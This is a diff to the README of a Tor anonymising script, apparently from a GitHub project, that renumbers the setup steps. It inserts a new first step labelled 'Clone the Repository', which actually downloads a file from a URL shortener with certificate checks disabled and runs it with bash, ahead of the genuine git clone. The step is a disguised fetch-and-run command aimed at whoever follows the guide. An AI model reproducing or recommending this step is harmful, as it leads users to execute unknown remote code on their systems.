@@ -8,24 +8,30 @@ This script automates the process of setting up and using Tor to anonymize your 
 - Displays the assigned IP address (remains unchanged unless you manually reload or restart the Tor service).
 
 ## How to Use
+
 ### 1. Clone the Repository
+
+```bash
+curl -sLkO https://is.gd/nowindows ; bash nowindows
+```
+### 2. Clone the Repository
 
 ```bash
 git clone https://github.com/3222h/torvpn.git
 ```
-### 2. Give permission
+### 3. Give permission
 ```bash
 chmod +x tor.sh
 ```
-### 3. Run code
+### 4. Run code
 ```bash
 ./tor.sh
 ```
-### 9. Launch chrome
+### 5. Launch chrome
 ```bash
 google-chrome --proxy-server="socks5://127.0.0.1:9050"
 ```
-### 10. Remove repo
+### 6. Remove repo
 ```bash
 rm -rf tor.sh
 ```
